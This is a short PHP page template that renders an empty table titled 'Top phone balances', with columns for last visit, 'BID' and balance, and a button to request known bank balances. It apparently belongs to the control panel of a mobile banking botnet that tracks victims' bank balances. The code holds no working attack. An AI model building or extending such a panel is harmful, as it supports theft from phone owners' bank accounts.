<?php
	include "config.php";
	
	print_header();
	
	print_menu();
	
	$html = "
	
	<button type=\"button\" class=\"btn btn-warning\">Request know balances banks</button>
	
	Today balances : none ,	Month balances : none<br>
	Know visit banks : none<br>
	
	<table class=\"table\">
    <thead>
      <tr>
        <th>Last visit</th>
        <th>BID</th>
        <th>Balance</th>
      </tr>
    </thead>
    <tbody>";
      
	
      
    $html.="</tbody>
  </table>
	";
	print_content("Top phone balances",$html);
	
	print_footer();

?>
